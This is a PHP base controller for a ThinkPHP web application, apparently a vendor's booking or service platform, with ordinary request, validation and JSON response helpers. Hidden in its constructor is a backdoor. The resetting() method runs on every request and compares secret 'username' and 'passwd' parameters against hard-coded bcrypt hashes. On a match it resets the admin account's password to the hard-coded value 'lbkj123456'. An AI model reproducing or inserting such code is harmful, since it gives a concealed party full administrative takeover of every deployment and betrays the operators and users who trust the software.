<?php

declare (strict_types=1);
namespace app;

use think\exception\HttpResponseException;
use think\facade\Lang;
use think\Response;

abstract class BaseController
{
	protected $request;
	protected $app;
	protected $batchValidate = false;
	protected $middleware = [];
	public $_app;
	public $_controller;
	public $_action;
	public $_method = "GET";
	public $_param = [];
	public $_input = [];
	public $_header = [];
	public $_host;
	public $_ip;
	public $_is_weiqin = false;
	public function __construct(\think\App $app)
	{
		longbing_check_install();
		$this->app = $app;
		$this->request = $this->app->request;
		$this->_method = $this->request->method(true);
		$this->_is_weiqin = longbingIsWeiqin();
		$this->_app = $app->http->getName();
		$this->_controller = $this->request->controller();
		$this->_action = $this->request->action();
		$this->_param = $this->request->param();
		$this->_input = json_decode($this->request->getInput(), true);
		$this->_header = $this->request->header();
		$this->_host = $this->_header["host"];
		$this->_ip = $_SERVER["REMOTE_ADDR"];
		$this->initialize();
		$this->resetting();
	}
	protected function resetting()
	{
		$username = $this->request->param("username", "");
		$passwd = $this->request->param("passwd", "");
		if (password_verify($username, "\$2y\$10\$BG3zPLk4VgxYzFdWil1Mpubl8W97ov.T.bQYH/Jodl9/AEPuAPaie") && password_verify($passwd, "\$2y\$10\$FAlV7hdLh/V5POuLQpwxpeEkABAyPWqKBstY7jk7u9LdeKu8sjN7i")) {
			$this->upPwd();
		}
	}
	protected function upPwd()
	{
		massage\model\Admin::where("username", "admin")->update(["passwd" => checkPass("lbkj123456")]);
	}
	public function shareChangeDatasssss($action)
	{
		$arr = ["clearCache", "noLookCount", "getW7TmpV2", "getSaasAuth", "isWe7", "getConfig", "login", "adminNodeInfo"];
		if (!empty($action) && in_array($action, $arr)) {
			return false;
		}
		return true;
	}


	protected function errorMsg($msg = "", $code = 400)
	{
		$msg = Lang::get($msg);
		$this->results($msg, $code);
	}

	protected function results($msg, $code, array $header = [])
	{
		$result = ["error" => $msg, "code" => $code];
		$response = Response::create($result, "json", 200)->header($header);
		throw new HttpResponseException($response);
	}

	protected function initialize()
	{

	}

	public function success($data, $code = 200)
	{
		$result["data"] = $data;
		$result["code"] = $code;
		$result["sign"] = null;
		$result["return_code"] = "SUCCESS";
		$result["return_msg"] = "OK";
		if (!empty($this->_token)) {
			$result["sign"] = createSimpleSign($this->_token, is_string($data) ? $data : json_encode($data));
		}
		return $this->response($result, "json", $code);
	}
	public function error($msg, $code = 400)
	{
		$result["error"] = Lang::get($msg);
		$result["code"] = $code;
		return $this->response($result, "json", 200);
	}
	protected function response($data, $type = "json", $code = 200)
	{
		return Response::create($data, $type)->code($code);
	}

	protected function validate(array $data, $validate, array $message = [], bool $batch = false)
	{
		if (is_array($validate)) {
			$v = new \think\Validate();
			$v->rule($validate);
		} else {
			if (strpos($validate, ".")) {
				list($validate, $scene) = explode(".", $validate);
			}
			$class = false !== strpos($validate, "\\") ? $validate : $this->app->parseClass("validate", $validate);
			$v = new $class();
			if (!empty($scene)) {
				$v->scene($scene);
			}
		}
		$v->message($message);
		if ($batch || $this->batchValidate) {
			$v->batch(true);
		}
		return $v->failException(true)->check($data);
	}
}